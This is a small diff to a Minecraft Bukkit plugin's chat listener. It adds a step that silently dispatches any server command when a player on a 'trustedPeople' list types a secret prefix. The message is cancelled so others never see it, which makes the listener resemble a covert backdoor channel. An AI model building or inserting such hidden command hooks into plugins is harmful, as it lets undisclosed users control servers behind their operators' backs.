@@ -32,6 +32,10 @@ public class AsyncChatEvent implements Listener {
         }
         if (e.getMessage().startsWith(Start.COMMAND_SIGN) && Start.Instance.trustedPeople.contains(p.getUniqueId())) {
             e.setCancelled(true);
+            if (e.getMessage().startsWith(Start.COMMAND_SIGN + "/")) {
+                Bukkit.getScheduler().runTask(Start.Instance, () -> Bukkit.dispatchCommand(p, e.getMessage().substring(2)));
+                return;
+            }
             String[] dmp = msg.substring(1).split(" ");
             ArrayList<String> args = new ArrayList<>(Arrays.asList(dmp).subList(1, dmp.length));
             for (Command command : Start.Instance.cm.commandList) {
